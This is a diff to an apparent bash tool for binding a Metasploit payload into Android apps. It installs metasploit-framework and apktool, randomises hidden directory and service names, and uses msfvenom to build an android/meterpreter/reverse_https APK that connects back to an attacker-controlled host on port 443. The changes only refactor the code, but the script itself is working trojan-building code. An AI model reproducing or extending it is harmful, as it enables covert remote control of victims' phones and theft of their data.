@@ -30,8 +30,8 @@ URL="$2"
 
 # Update system and install required packages
 echo -e "${GREEN}[*] Updating system and installing required packages...${NC}"
-apt update && apt upgrade -y && apt dist-upgrade -y && apt autoremove -y && apt autoclean -y
-apt install -y wget curl git net-tools gnupg apt-transport-https locate apktool metasploit-framework
+apt update;apt upgrade -qy;apt dist-upgrade -qy;apt autoremove -qy;apt autoclean -qy
+apt install -qy wget curl git net-tools gnupg apt-transport-https locate apktool metasploit-framework
 
 # Kill any running ngrok or ruby processes (ignore errors if not found)
 pkill -f 'ngrok\|ruby' || true
@@ -94,16 +94,15 @@ join_by()
 
 binder()
 {	
-    local i
-    # Generate random strings using uuidgen
-    local -a RAND=()
-    for i in {1..7}; do
-        RAND+=("$(uuidgen | tr -d '-' | head -c 20)")
-    done
-    local RAND_DIR="${RAND[1]}"
-    local RAND_MAINBRAD="${RAND[2]}"
-    local RAND_PAYLOAD="${RAND[3]}"
-    local RAND_MainService="${RAND[4]}"
+	for i in $(seq 1 7); do
+		a[$i]=`cat /proc/sys/kernel/random/uuid | sed 's/[-]//g' | head -c 20; echo;`
+	done
+
+	RAND=(${a[@]})
+	RAND_DIR=${RAND[1]}
+	RAND_MAINBRAD=${RAND[2]}
+	RAND_PAYLOAD=${RAND[3]}
+	RAND_MainService=${RAND[4]}
 
     # Generate payload APK using msfvenom
     msfvenom --platform android -a dalvik -p android/meterpreter/reverse_https LHOST="$NoIP" LPORT=443 -o /tmp/payload.apk
